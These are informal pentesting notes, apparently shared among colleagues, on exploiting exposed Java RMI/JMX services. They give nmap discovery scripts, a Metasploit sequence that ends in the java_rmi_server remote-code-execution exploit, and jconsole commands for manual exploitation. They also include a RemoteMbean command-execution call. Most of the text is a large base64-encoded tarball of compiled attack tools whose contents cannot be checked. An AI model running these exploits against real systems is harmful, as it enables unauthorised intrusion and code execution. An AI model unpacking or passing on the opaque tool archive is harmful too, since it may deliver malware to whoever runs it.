So I came across some interesting articles about exploiting RMI that
could be useful to us so here are my notes about it:

############## NMAP/Nessus/Metasploit method

Step 1 - Discovery

nmap --script=rmi-vuln-classloader IP -p 14248 -sV  -n
nmap --script rmi-dumpregistry.nse -sV --version-all  -p 14248 IP
Nessus (will identify this as 'RMI Registry Detection')

Step 2  - Enumeration

msfcli auxiliary/gather/java_rmi_registry RHOST=IP RPORT=14248 E

Step 3 - VA

msfcli auxiliary/scanner/misc/java_rmi_server RHOSTS=IP RPORT=14248 E

#Note: you might get '[*] IP:14248 Java RMI Endpoint Detected: Class
Loader Disabled' in which case standard exploits won't work
#Proceed to next step only if you don't get 'Class Loader Disabled'

Step 4 - EXP

msfcli exploit/multi/misc/java_rmi_server RHOST=IP RPORT=14248 E



############## Manual Pwnage:

jconsole service:jmx:rmi://IP:14248/jndi/rmi://IP:32844/jmxrmi
jconsole IP:14248
jconsole -debug service:jmx:rmi:///jndi/rmi://IP:32844/jmxrmi

Then you need to assess exposed methods to see if you can cause a manual
RCE/LFI etc.
Depending on whats exposed you might have some luck an execute remote
commands on the system.

############## 3rd Party Tools
info:
https://www.optiv.com/blog/exploiting-jmx-rmi/

exec cmd:
java RemoteMbean IP 32844 "id"

tools.tar.gz (compiled from article):

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
b+RvbbIfnwB4AAA=
